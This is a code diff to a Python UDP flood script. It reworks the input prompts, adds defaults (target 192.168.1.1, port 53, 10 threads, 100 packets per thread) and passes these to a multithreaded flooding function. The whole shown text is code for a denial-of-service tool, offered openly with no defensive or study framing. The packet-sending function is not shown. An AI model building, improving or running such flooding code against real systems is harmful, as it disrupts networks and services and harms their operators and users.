@@ -22,7 +22,7 @@ def udp_flood(ip, port, threads, packets, delay):
     thread_list = []
 
     for t in range(threads):
-        th = threading.Thread(target=udp_spammer, args=(t, ip, port, packets, delay))
+        th = threading.Thread(target=udp_spammer, args=(t + 1, ip, port, packets, delay))
         th.start()
         thread_list.append(th)
 
@@ -31,15 +31,30 @@ def udp_flood(ip, port, threads, packets, delay):
 
     print("\nUDP Flood Executed.")
 
-def get_int(prompt, minimum=1):
-    # Getting fields safely with user-friendly instructions
+def get_int(prompt, default, minimum=1):
     while True:
-
         try:
-            val = int(input(prompt))
+            user_input = input(f"{prompt} (default {default}): ").strip()
+            if not user_input:
+                return default
+            
+            if int(user_input) >= minimum:
+                return int(user_input)
+            
+            print(f"Value must be >= {minimum}")
 
-            if val >= minimum:
-                return val
+        except ValueError:
+            print("Please enter a number.")
+
+def get_float(prompt, default, minimum=0.0):
+    while True:
+        try:
+            user_input = input(f"{prompt} (default {default}): ").strip()
+            if not user_input:
+                return default
+            
+            if float(user_input) >= minimum:
+                return float(user_input)
             
             print(f"Value must be >= {minimum}")
 
@@ -49,13 +64,13 @@ def get_int(prompt, minimum=1):
 if __name__ == "__main__":
     
     try:
-        ip = input("Target IP: ").strip()
-        port = get_int("Target Port: ", 1)
-        threads = get_int("Threads: ", 1)
-        packets = get_int("Packets per thread: ", 1)
-        delay = float(input("Delay (0 for none): ").strip() or 0)
+        target_ip = input("Target IP: (default 192.168.1.1): ").strip() or "192.168.1.1"
+        target_port = get_int("Target Port:", default=53)
+        num_threads = get_int("Threads:", default=10)
+        num_packets = get_int("Packets per thread:", default=100)
+        delay = get_float("Delay:", default=0.0)
 
-        udp_flood(ip, port, threads, packets, delay)
+        udp_flood(target_ip, target_port, num_threads, num_packets, delay)
 
     except KeyboardInterrupt:
         print("\n[!] Aborted by user.")
